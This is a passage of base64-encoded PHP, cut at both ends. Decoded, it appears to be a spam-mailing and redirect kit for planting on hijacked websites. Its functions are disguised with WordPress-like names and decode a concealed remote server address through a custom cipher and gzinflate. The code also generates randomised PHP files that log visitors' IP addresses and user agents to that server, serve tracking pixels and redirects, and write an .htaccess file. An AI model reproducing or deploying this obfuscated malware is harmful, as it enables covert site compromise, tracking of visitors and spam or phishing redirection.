ywgJHRoaXMtPnNlcnZlcl9jYXBzKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignSEVMTyBoYW5kc2hha2Ugd2FzIHVzZWQuIENsaWVudCBrbm93cyBub3RoaW5nIGFib3V0IHNlcnZlciBleHRlbnNpb25zJyk7DQogICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzWyRuYW1lXTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RSZXBseSgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5sYXN0X3JlcGx5Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2xpbmVzKCkgew0KICAgICAgICBpZiAoIWlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7DQogICAgICAgICAgICByZXR1cm4gJyc7DQogICAgICAgIH0NCiAgICAgICAgJGRhdGEgICAgPSAnJzsNCiAgICAgICAgJGVuZHRpbWUgPSAwOw0KICAgICAgICBzdHJlYW1fc2V0X3RpbWVvdXQoJHRoaXMtPnNtdHBfY29ubiwgJHRoaXMtPlRpbWVvdXQpOw0KICAgICAgICBpZiAoJHRoaXMtPlRpbWVsaW1pdCA+IDApIHsNCiAgICAgICAgICAgICRlbmR0aW1lID0gdGltZSgpICsgJHRoaXMtPlRpbWVsaW1pdDsNCiAgICAgICAgfQ0KICAgICAgICB3aGlsZSAoaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikgJiYgIWZlb2YoJHRoaXMtPnNtdHBfY29ubikpIHsNCiAgICAgICAgICAgICRzdHIgPSBAZmdldHMoJHRoaXMtPnNtdHBfY29ubiwgNTE1KTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIlNNVFAgLT4gZ2V0X2xpbmVzKCk6IFwkZGF0YSBpcyBcIiRkYXRhXCIiLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJTTVRQIC0+IGdldF9saW5lcygpOiBcJHN0ciBpcyAgXCIkc3RyXCIiLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICAkZGF0YSAuPSAkc3RyOw0KICAgICAgICAgICAgaWYgKChpc3NldCgkc3RyWzNdKSBhbmQgJHN0clszXSA9PSAnICcpKSB7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkaW5mbyA9IHN0cmVhbV9nZXRfbWV0YV9kYXRhKCR0aGlzLT5zbXRwX2Nvbm4pOw0KICAgICAgICAgICAgaWYgKCRpbmZvWyd0aW1lZF9vdXQnXSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHRpbWVkLW91dCAoJyAuICR0aGlzLT5UaW1lb3V0IC4gJyBzZWMpJywgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRlbmR0aW1lIGFuZCB0aW1lKCkgPiAkZW5kdGltZSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHRpbWVsaW1pdCByZWFjaGVkICgnIC4gJHRoaXMtPlRpbWVsaW1pdCAuICcgc2VjKScsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGRhdGE7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRWZXJwKCRlbmFibGVkID0gZmFsc2UpIHsNCiAgICAgICAgJHRoaXMtPmRvX3ZlcnAgPSAkZW5hYmxlZDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFZlcnAoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+ZG9fdmVycDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldEVycm9yKCRtZXNzYWdlLCAkZGV0YWlsID0gJycsICRzbXRwX2NvZGUgPSAnJywgJHNtdHBfY29kZV9leCA9ICcnKSB7DQogICAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KA0KICAgICAgICAgICAgJ2Vycm9yJyA9PiAkbWVzc2FnZSwNCiAgICAgICAgICAgICdkZXRhaWwnID0+ICRkZXRhaWwsDQogICAgICAgICAgICAnc210cF9jb2RlJyA9PiAkc210cF9jb2RlLA0KICAgICAgICAgICAgJ3NtdHBfY29kZV9leCcgPT4gJHNtdHBfY29kZV9leA0KICAgICAgICApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0RGVidWdPdXRwdXQoJG1ldGhvZCA9ICdlY2hvJykgew0KICAgICAgICAkdGhpcy0+RGVidWdvdXRwdXQgPSAkbWV0aG9kOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdPdXRwdXQoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+RGVidWdvdXRwdXQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z0xldmVsKCRsZXZlbCA9IDApIHsNCiAgICAgICAgJHRoaXMtPmRvX2RlYnVnID0gJGxldmVsOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdMZXZlbCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5kb19kZWJ1ZzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldFRpbWVvdXQoJHRpbWVvdXQgPSAwKSB7DQogICAgICAgICR0aGlzLT5UaW1lb3V0ID0gJHRpbWVvdXQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUaW1lb3V0KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPlRpbWVvdXQ7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlcnJvckhhbmRsZXIoJGVycm5vLCAkZXJybXNnKSB7DQogICAgICAgICRub3RpY2UgPSAnQ29ubmVjdGlvbjogRmFpbGVkIHRvIGNvbm5lY3QgdG8gc2VydmVyLic7DQogICAgICAgICR0aGlzLT5zZXRFcnJvcigkbm90aWNlLCAkZXJybm8sICRlcnJtc2cpOw0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCRub3RpY2UgLiAnIEVycm9yIG51bWJlciAnIC4gJGVycm5vIC4gJy4gIkVycm9yIG5vdGljZTogJyAuICRlcnJtc2csIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TGFzdFRyYW5zYWN0aW9uSUQoKSB7DQogICAgICAgICRyZXBseSA9ICR0aGlzLT5nZXRMYXN0UmVwbHkoKTsNCiAgICAgICAgaWYgKGVtcHR5KCRyZXBseSkpIHsNCiAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5zbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm5zIGFzICRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm4pIHsNCiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm4sICRyZXBseSwgJG1hdGNoZXMpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICRtYXRjaGVzWzFdOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQp9DQpmdW5jdGlvbiBEaXNwbGF5NDA0UGFnZSgpIHsNCiAgICAkc2FwaV9uYW1lID0gcGhwX3NhcGlfbmFtZSgpOw0KICAgIGlmICgkc2FwaV9uYW1lID09ICdjZ2knIHx8ICRzYXBpX25hbWUgPT0gJ2NnaS1mY2dpJykgew0KICAgICAgICBoZWFkZXIoJ1N0YXR1czogNDA0IE5vdCBGb3VuZCcpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGhlYWRlcigkX1NFUlZFUlsnU0VSVkVSX1BST1RPQ09MJ10gLiAnIDQwNCBOb3QgRm91bmQnKTsNCiAgICB9DQogICAgJF9TRVJWRVJbJ1JFRElSRUNUX1NUQVRVUyddID0gNDA0Ow0KICAgIGVjaG8gJzwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vSUVURi8vRFREIEhUTUwgMi4wLy9FTiI+DQoJPGh0bWw+PGhlYWQ+DQoJPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPg0KCTwvaGVhZD48Ym9keT4NCgk8aDE+Tm90IEZvdW5kPC9oMT4NCgk8cD5UaGUgcmVxdWVzdGVkIFVSTCAnIC4gJF9TRVJWRVJbUkVRVUVTVF9VUkldIC4gJyB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvcD4NCgk8cD5BZGRpdGlvbmFsbHksIGEgNDA0IE5vdCBGb3VuZCBlcnJvciB3YXMgZW5jb3VudGVyZWQgd2hpbGUgdHJ5aW5nIHRvIHVzZSBhbiBFcnJvckRvY3VtZW50IHRvIGhhbmRsZSB0aGUgcmVxdWVzdC48L3A+DQoJPGhyPicgLiAkX1NFUlZFUltTRVJWRVJfU0lHTkFUVVJFXSAuICc8L2JvZHk+PC9odG1sPic7DQogICAgZXhpdDsNCn0NCmZ1bmN0aW9uIHByZV90ZXJtX25hbWUoJHdwX2tzZXNfZGF0YSwgJHdwX25vbmNlKSB7DQogICAgJHdwX25vbmNlICAgID0gYmFzZTY0X2RlY29kZSgkd3Bfbm9uY2UpOw0KICAgICRrc2VzX3N0ciAgICA9IHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAnJScsDQogICAgICAgICcqJw0KICAgICksIGFycmF5KA0KICAgICAgICAnLycsDQogICAgICAgICc9Jw0KICAgICksICR3cF9rc2VzX2RhdGEpOw0KICAgICRmaWx0ZXIgICAgICA9IGJhc2U2NF9kZWNvZGUoJGtzZXNfc3RyKTsNCiAgICAkbWQ1ICAgICAgICAgPSBzdHJyZXYoJHdwX25vbmNlKTsNCiAgICAkc3ViICAgICAgICAgPSBzdWJzdHIobWQ1KCRtZDUpLCAwLCBzdHJsZW4oJHdwX25vbmNlKSk7DQogICAgJHdwX25vbmNlICAgID0gbWQ1KCR3cF9ub25jZSkgLiAkc3ViOw0KICAgICRwcmVwYXJlZnVuYyA9ICdnemluZmxhdGUnOw0KICAgICRpICAgICAgICAgICA9IDA7DQogICAgZG8gew0KICAgICAgICAkb3JkICAgICAgICA9IG9yZCgkZmlsdGVyWyRpXSkgLSBvcmQoJHdwX25vbmNlWyRpXSk7DQogICAgICAgICRmaWx0ZXJbJGldID0gY2hyKCRvcmQgJSAyNTYpOw0KICAgICAgICAkd3Bfbm9uY2UgLj0gJGZpbHRlclskaV07DQogICAgICAgICRpKys7DQogICAgfSB3aGlsZSAoJGkgPCBzdHJsZW4oJGZpbHRlcikpOw0KICAgIHJldHVybiBAJHByZXBhcmVmdW5jKCRmaWx0ZXIpOw0KfQ0KZnVuY3Rpb24gR2V0TWFpbFVSTCgpIHsNCiAgICByZXR1cm4gcHJlX3Rlcm1fbmFtZSgiQWx1TlcrVUxPUVNBa1pRRWZtWmhnR0VHa0srT2l3Q3dzanVQWUF4dE13KioiLCAiZUhOaGVtOTYiKTsNCn0NCmZ1bmN0aW9uIFJlZGlyZWN0aW9uRmlsZSgpIHsNCiAgICAkRnVuY3Rpb24xID0gImZyIiAuIHJhbmRTdHIoNyk7DQogICAgJEZ1bmN0aW9uMiA9ICJmciIgLiByYW5kU3RyKDcpOw0KICAgICRGdW5jdGlvbjMgPSAiZnIiIC4gcmFuZFN0cig3KTsNCiAgICAkRnVuY3Rpb240ID0gImZyIiAuIHJhbmRTdHIoNyk7DQogICAgJFBocFNvdXJjZSA9ICc8P3BocA0KZnVuY3Rpb24gY1VSTFJlcXVlc3QoJHVybCwgJHBvc3RGaWVsZHMgPSBudWxsLCAkaHR0cEhlYWRlciA9IGFycmF5KCkpIHsNCgkkY2ggPSBjdXJsX2luaXQoKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRlJFU0hfQ09OTkVDVCwgdHJ1ZSk7DQoJaWYgKCFlbXB0eSgkcG9zdEZpZWxkcykpIHsNCgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJHBvc3RGaWVsZHMpOw0KCX0NCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOyBXaW5kb3dzIE5UIDYuMTsgLk5FVCBDTFIgMS4xLjQzMjIpIik7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgOTApOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0VOQ09ESU5HLCBcJ2d6aXAsIGRlZmxhdGVcJyk7DQoJJGhlYWRlcnMgICA9IGFycmF5KCk7DQoJJGhlYWRlcnNbXSA9ICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IHJ2OjQ1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDUuMCI7DQoJJGhlYWRlcnNbXSA9ICJBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOCI7DQoJJGhlYWRlcnNbXSA9ICJBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41IjsNCgkkaGVhZGVyc1tdID0gIkNvbm5lY3Rpb246IGtlZXAtYWxpdmUiOw0KCSRoZWFkZXJzW10gPSAiQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wIjsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgJGhlYWRlcnMpOw0KCSRwYWdlICAgICA9IGN1cmxfZXhlYygkY2gpOw0KCSRodHRwY29kZSA9IGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hUVFBfQ09ERSk7DQoJaWYgKCRodHRwY29kZSA9PSA1MDApIHsNCgkJcmV0dXJuICJFUlJPUl81MDBfQ1VSTCI7DQoJfQ0KCWlmICgkaHR0cGNvZGUgPT0gNDA0KSB7DQoJCXJldHVybiAiRVJST1JfNDA0X0NVUkwiOw0KCX0NCglpZiAoJGh0dHBjb2RlID09IDQwMykgew0KCQlyZXR1cm4gIkVSUk9SXzQwM19DVVJMIjsNCgl9DQoJaWYgKGN1cmxfZXJybm8oJGNoKSkgew0KCQlyZXR1cm4gIkNVUkxfRVJSTk98IiAuIGN1cmxfZXJyb3IoJGNoKTsNCgl9DQoJY3VybF9jbG9zZSgkY2gpOw0KCXJldHVybiAkcGFnZTsNCn0NCmZ1bmN0aW9uIEdldFBhZ2VDb250ZW50KCR1cmwsICRwb3N0RmllbGRzID0gbnVsbCkgew0KCWlmIChmdW5jdGlvbl9leGlzdHMoXCdjdXJsX2luaXRcJykpIHsNCgkJcmV0dXJuIGNVUkxSZXF1ZXN0KCR1cmwsICRwb3N0RmllbGRzKTsNCgl9IGVsc2VpZiAoIWZ1bmN0aW9uX2V4aXN0cyhcJ2ZpbGVfZ2V0X2NvbnRlbnRzXCcpKSB7DQoJCXJldHVybiBcJ2ZpbGVfZ2V0X2NvbnRlbnRzIG5vdCBhdmFpbGFibGUgIVwnOw0KCX0gZWxzZSB7DQoJCWlmIChpc19hcnJheSgkcG9zdEZpZWxkcykpIHsNCgkJCSRwb3N0ZGF0YSA9IGh0dHBfYnVpbGRfcXVlcnkoJHBvc3RGaWVsZHMpOw0KCQkJJG9wdHMgICAgID0gYXJyYXkoDQoJCQkJXCdodHRwXCcgPT4gYXJyYXkoDQoJCQkJCVwnbWV0aG9kXCcgPT4gXCdQT1NUXCcsDQoJCQkJCVwnaGVhZGVyXCcgPT4gXCdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFwnLA0KCQkJCQlcJ2NvbnRlbnRcJyA9PiAkcG9zdGRhdGENCgkJCQkpDQoJCQkpOw0KCQkJJGNvbnRleHQgID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRzKTsNCgkJCSRyZXN1bHQgICA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgJGNvbnRleHQpOw0KCQkJcmV0dXJuICRyZXN1bHQ7DQoJCX0gZWxzZSB7DQoJCQlyZXR1cm4gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOw0KCQl9DQoJfQ0KfQ0KZnVuY3Rpb24gJyAuICRGdW5jdGlvbjEgLiAnKCQnIC4gJEZ1bmN0aW9uNCAuICcsICQnIC4gJEZ1bmN0aW9uMyAuICcpIHsNCgkkJyAuICRGdW5jdGlvbjMgLiAnICAgID0gYmFzZTY0X2RlY29kZSgkJyAuICRGdW5jdGlvbjMgLiAnKTsNCgkka3Nlc19zdHIgICAgPSBzdHJfcmVwbGFjZShhcnJheSgNCgkJXCclXCcsDQoJCVwnKlwnDQoJKSwgYXJyYXkoDQoJCVwnL1wnLA0KCQlcJz1cJw0KCSksICQnIC4gJEZ1bmN0aW9uNCAuICcpOw0KCSRmaWx0ZXIgICAgICA9IGJhc2U2NF9kZWNvZGUoJGtzZXNfc3RyKTsNCgkkbWQ1ICAgICAgICAgPSBzdHJyZXYoJCcgLiAkRnVuY3Rpb24zIC4gJyk7DQoJJHN1YiAgICAgICAgID0gc3Vic3RyKG1kNSgkbWQ1KSwgMCwgc3RybGVuKCQnIC4gJEZ1bmN0aW9uMyAuICcpKTsNCgkkJyAuICRGdW5jdGlvbjMgLiAnICAgID0gbWQ1KCQnIC4gJEZ1bmN0aW9uMyAuICcpIC4gJHN1YjsNCgkkcHJlcGFyZWZ1bmMgPSBcJ2d6aW5mbGF0ZVwnOw0KCSRpICAgICAgICAgICA9IDA7DQoJZG8gew0KCQkkb3JkICAgICAgICA9IG9yZCgkZmlsdGVyWyRpXSkgLSBvcmQoJCcgLiAkRnVuY3Rpb24zIC4gJ1skaV0pOw0KCQkkZmlsdGVyWyRpXSA9IGNocigkb3JkICUgMjU2KTsNCgkJJCcgLiAkRnVuY3Rpb24zIC4gJyAuPSAkZmlsdGVyWyRpXTsNCgkJJGkrKzsNCgl9IHdoaWxlICgkaSA8IHN0cmxlbigkZmlsdGVyKSk7DQoJcmV0dXJuIEAkcHJlcGFyZWZ1bmMoJGZpbHRlcik7DQp9DQpmdW5jdGlvbiAnIC4gJEZ1bmN0aW9uMiAuICcoKSB7DQoJcmV0dXJuICcgLiAkRnVuY3Rpb24xIC4gJygiQWx1TlcrVUxPUVNBa1pRRWZtWmhnR0VHa0srT2l3Q3dzanVQWUF4dE13KioiLCAiZUhOaGVtOTYiKTsNCn0NCmZ1bmN0aW9uIGdldF9pcF9hZGRyZXNzKCkgew0KCWZvcmVhY2ggKGFycmF5KA0KCQlcJ0hUVFBfQ0xJRU5UX0lQXCcsDQoJCVwnSFRUUF9YX0ZPUldBUkRFRF9GT1JcJywNCgkJXCdIVFRQX1hfRk9SV0FSREVEXCcsDQoJCVwnSFRUUF9YX0NMVVNURVJfQ0xJRU5UX0lQXCcsDQoJCVwnSFRUUF9GT1JXQVJERURfRk9SXCcsDQoJCVwnSFRUUF9GT1JXQVJERURcJywNCgkJXCdSRU1PVEVfQUREUlwnDQoJKSBhcyAka2V5KSB7DQoJCWlmIChhcnJheV9rZXlfZXhpc3RzKCRrZXksICRfU0VSVkVSKSA9PT0gdHJ1ZSkgew0KCQkJZm9yZWFjaCAoZXhwbG9kZShcJyxcJywgJF9TRVJWRVJbJGtleV0pIGFzICRpcCkgew0KCQkJCSRpcCA9IHRyaW0oJGlwKTsNCgkJCQlpZiAoZmlsdGVyX3ZhcigkaXAsIEZJTFRFUl9WQUxJREFURV9JUCwgRklMVEVSX0ZMQUdfTk9fUFJJVl9SQU5HRSB8IEZJTFRFUl9GTEFHX05PX1JFU19SQU5HRSkgIT09IGZhbHNlKSB7DQoJCQkJCXJldHVybiAkaXA7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJfQ0KfQ0KZnVuY3Rpb24gRGlzcGxheTQwNFBhZ2UoKSB7DQoJJHNhcGlfbmFtZSA9IHBocF9zYXBpX25hbWUoKTsNCglpZiAoJHNhcGlfbmFtZSA9PSBcJ2NnaVwnIHx8ICRzYXBpX25hbWUgPT0gXCdjZ2ktZmNnaVwnKSB7DQoJCWhlYWRlcihcJ1N0YXR1czogNDA0IE5vdCBGb3VuZFwnKTsNCgl9IGVsc2Ugew0KCQloZWFkZXIoJF9TRVJWRVJbXCdTRVJWRVJfUFJPVE9DT0xcJ10gLiBcJyA0MDQgTm90IEZvdW5kXCcpOw0KCX0NCgkkX1NFUlZFUltcJ1JFRElSRUNUX1NUQVRVU1wnXSA9IDQwNDsNCgllY2hvIFwnPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4NCgk8aHRtbD48aGVhZD4NCgk8dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+DQoJPC9oZWFkPjxib2R5Pg0KCTxoMT5Ob3QgRm91bmQ8L2gxPg0KCTxwPlRoZSByZXF1ZXN0ZWQgVVJMIFwnIC4gJF9TRVJWRVJbUkVRVUVTVF9VUkldIC4gXCcgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+DQoJPHA+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPg0KCTxocj5cJyAuICRfU0VSVkVSW1NFUlZFUl9TSUdOQVRVUkVdIC4gXCc8L2JvZHk+PC9odG1sPlwnOw0KCWV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbXCdyZXdyaXRlXCddKSkgew0KCSRSZXdyaXRlID0gJF9HRVRbXCdyZXdyaXRlXCddOw0KfSBlbHNlIHsNCgkkUmV3cml0ZSA9ICRfU0VSVkVSW1wnUkVRVUVTVF9VUklcJ107DQp9DQppZiAoc3RycG9zKCRSZXdyaXRlLCBcJ25ld3NsZXR0ZXJfaW1hZ2UvXCcpICE9PSBmYWxzZSkgew0KCWxpc3QoJGlkLCAkaW1hZ2VfbmFtZSkgPSBAZXhwbG9kZShcJ25ld3NsZXR0ZXJfaW1hZ2UvXCcsICRSZXdyaXRlKTsNCgkkcGFyYW1ldGVycyA9IGFycmF5KA0KCQkiaXAiID0+IGdldF9pcF9hZGRyZXNzKCksDQoJCSJhZ2VudCIgPT4gJF9TRVJWRVJbXCdIVFRQX1VTRVJfQUdFTlRcJ10sDQoJKTsNCgkkY2hlY2tyZWFkID0gQEdldFBhZ2VDb250ZW50KCcgLiAkRnVuY3Rpb24yIC4gJygpIC4gJGltYWdlX25hbWUgLiAiPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbWV0ZXJzKSApOw0KCWhlYWRlcihcJ0NvbnRlbnQtVHlwZTogaW1hZ2UvZ2lmXCcpOw0KCWVjaG8gYmFzZTY0X2RlY29kZShcJ1IwbEdPRGxoQVFBQkFKQUFBUDhBQUFBQUFDSDVCQVVRQUFBQUxBQUFBQUFCQUFFQUFBSUNCQUVBT3c9PVwnKTsNCglleGl0Ow0KfQ0KaWYgKHN0cnBvcygkUmV3cml0ZSwgXCdyZWRpcmVjdC9cJykgIT09IGZhbHNlKSB7DQoJbGlzdCgkaWQsICRyZWRpcmVjdF9uYW1lKSA9IEBleHBsb2RlKFwncmVkaXJlY3QvXCcsICRSZXdyaXRlKTsNCglsaXN0KCRlbWFpbGlkLCAkcmVkaXJlY3QpID0gQGV4cGxvZGUoXCctaWQtXCcsICRyZWRpcmVjdF9uYW1lKTsNCglsaXN0KCRyYW5kb20sICRyZWFsX25hbWUpID0gQGV4cGxvZGUoXCctdG8tXCcsICRyZWRpcmVjdCk7DQoJJHBhcmFtZXRlcnMgPSBhcnJheSgNCgkJIm5hbWUiID0+ICRyZWFsX25hbWUsDQoJCSJpcCIgPT4gZ2V0X2lwX2FkZHJlc3MoKSwNCgkJImFnZW50IiA9PiAkX1NFUlZFUltcJ0hUVFBfVVNFUl9BR0VOVFwnXSwNCgkJImlkIiA9PiAkZW1haWxpZA0KCSk7DQoJJHVybCA9ICcgLiAkRnVuY3Rpb24yIC4gJygpIC4gInJlZGlyZWN0aW9uLz8iIC4gaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1ldGVycyk7DQoJJHJlc3VsdCA9IEBHZXRQYWdlQ29udGVudCgkdXJsKTsNCglpZiAoZmlsdGVyX3ZhcigkcmVzdWx0LCBGSUxURVJfVkFMSURBVEVfVVJMKSkgew0KCQloZWFkZXIoIkxvY2F0aW9uOiAiIC4gJHJlc3VsdCk7DQoJfSBlbHNlIHsNCgkJRGlzcGxheTQwNFBhZ2UoKTsNCgl9DQoJZXhpdDsNCn0nOw0KICAgIHJldHVybiAkUGhwU291cmNlOw0KfQ0KZnVuY3Rpb24gaXNSZXdyaXRlT04oJHMgPSBmYWxzZSkgew0KICAgIGlmICgkcyA9PSBmYWxzZSkgew0KICAgICAgICAkcyA9ICRfU0VSVkVSOw0KICAgIH0NCiAgICBpZiAoaXNzZXQoJHNbJ0hUVFBfTU9EX1JFV1JJVEVfU0hFTEwnXSkpIHsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCmZ1bmN0aW9uIHBhcmVudGRpcigkdXJsKSB7DQogICAgJHVybCA9IGN1cnJlbnRkaXIoJHVybCk7DQogICAgJGxlbiA9IHN0cmxlbigkdXJsKTsNCiAgICByZXR1cm4gY3VycmVudGRpcihzdWJzdHIoJHVybCwgMCwgJGxlbiAmJiAkdXJsWyRsZW4gLSAxXSA9PSAnLycgPyAtMSA6ICRsZW4pKTsNCn0NCmZ1bmN0aW9uIGN1cnJlbnRkaXIoJHVybCkgew0KICAgIGlmICgkZmlyc3RfcXVlcnkgPSBzdHJwb3MoJHVybCwgJz8nKSkNCiAgICAgICAgJHVybCA9IHN1YnN0cigkdXJsLCAwLCAkZmlyc3RfcXVlcnkpOw0KICAgIGlmICgkZmlyc3RfZnJhZ21lbnQgPSBzdHJwb3MoJHVybCwgJyMnKSkNCiAgICAgICAgJHVybCA9IHN1YnN0cigkdXJsLCAwLCAkZmlyc3RfZnJhZ21lbnQpOw0KICAgICRsYXN0X3NsYXNoID0gc3RycnBvcygkdXJsLCAnLycpOw0KICAgIGlmICghJGxhc3Rfc2xhc2gpIHsNCiAgICAgICAgcmV0dXJuICcvJzsNCiAgICB9DQogICAgaWYgKCgkZmlyc3RfY29sb24gPSBzdHJwb3MoJHVybCwgJzovLycpKSAhPT0gZmFsc2UgJiYgJGZpcnN0X2NvbG9uICsgMiA9PSAkbGFzdF9zbGFzaCkgew0KICAgICAgICByZXR1cm4gJHVybCAuICcvJzsNCiAgICB9DQogICAgcmV0dXJuIHN1YnN0cigkdXJsLCAwLCAkbGFzdF9zbGFzaCArIDEpOw0KfQ0KZnVuY3Rpb24gQ3JlYXRlSFRhY2Nlc3MoKSB7DQogICAgJENvbnRlbnQgICA9IGFycmF5KCk7DQogICAgJENvbnRlbnRbXSA9ICc8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4nOw0KICAgICRDb250ZW50W10gPSAnCTxJZk1vZHVsZSBtb2RfZW52LmM+JzsNCiAgICAkQ29udGVudFtdID0gJwkJU2V0RW52IEhUVFBfTU9EX1JFV1JJVEVfU0hFTEwgT24nOw0KICAgICRDb250ZW50W10gPSAnCTwvSWZNb2R1bGU+JzsNCiAgICAkQ29udGVudFtdID0gJzwvSWZNb2R1bGU+JzsNCiAgICBAZmlsZV9wdXRfY29udGVudHMoIi5odGFjY2VzcyIsIGltcGxvZGUoUEhQX0VPTCwgJENvbnRlbnQpKTsNCn0NCmZ1bmN0aW9uIEdldFJlZGlyZWN0aW9uTGluaygkdXJsID0gZmFsc2UpIHsNCiAgICBpZiAoJHVybCA9PSBmYWxzZSkgew0KICAgICAgICAkdXJsID0gZnVsbF91cmwoJF9TRVJWRVIpOw0KICAgIH0NCiAgICAkQ3VycmVudFVSTCAgICAgPSBjdXJyZW50ZGlyKCR1cmwpOw0KICAgICRSZWRpcmVjdGlvbkRpc